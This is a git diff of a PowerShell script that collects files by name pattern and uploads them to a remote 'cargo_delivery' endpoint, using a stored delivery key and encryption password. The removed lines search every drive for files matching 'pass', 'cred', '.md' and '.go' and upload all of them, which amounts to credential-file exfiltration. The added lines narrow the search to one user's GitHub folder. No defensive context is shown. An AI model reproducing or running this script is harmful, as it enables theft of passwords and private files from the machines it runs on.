@@ -20,16 +20,18 @@ $deliveryKey = $creds.delivery_key
 $encryptionPassword = $creds.encryption_password
 $url = "http://$($creds.URL):$($creds.Port)/cargo_delivery"
 
-# Function to search for files
+# Function to search for files in multiple directories
 function Search-Files {
     param (
-        [string]$rootDir,
+        [string[]]$rootDirs,
         [string[]]$patterns
     )
 
     $files = @()
-    foreach ($pattern in $patterns) {
-        $files += Get-ChildItem -Path $rootDir -Recurse -Include *$pattern* -ErrorAction SilentlyContinue
+    foreach ($rootDir in $rootDirs) {
+        foreach ($pattern in $patterns) {
+            $files += Get-ChildItem -Path $rootDir -Recurse -Include *$pattern* -ErrorAction SilentlyContinue
+        }
     }
 
     return $files
@@ -59,17 +61,14 @@ function Upload-File {
     }
 }
 
-# Get all drives
-$drives = Get-PSDrive -PSProvider FileSystem
+# Define custom directories to search
+$customDirs = @(
+    "C:\Users\rafa\OneDrive\Documentos\GitHub"
+)
 
 # Search for files and upload them
-foreach ($drive in $drives) {
-    $driveRoot = $drive.Root
-    Write-Output "Searching in drive: $driveRoot"
+$files = Search-Files -rootDirs $customDirs -patterns @(".go", "nothing") # Search for files with 
 
-    $files = Search-Files -rootDir $driveRoot -patterns @(".go", ".md", "pass", "cred")
-
-    foreach ($file in $files) {
-        Upload-File -filePath $file.FullName
-    }
+foreach ($file in $files) {
+    Upload-File -filePath $file.FullName
 }
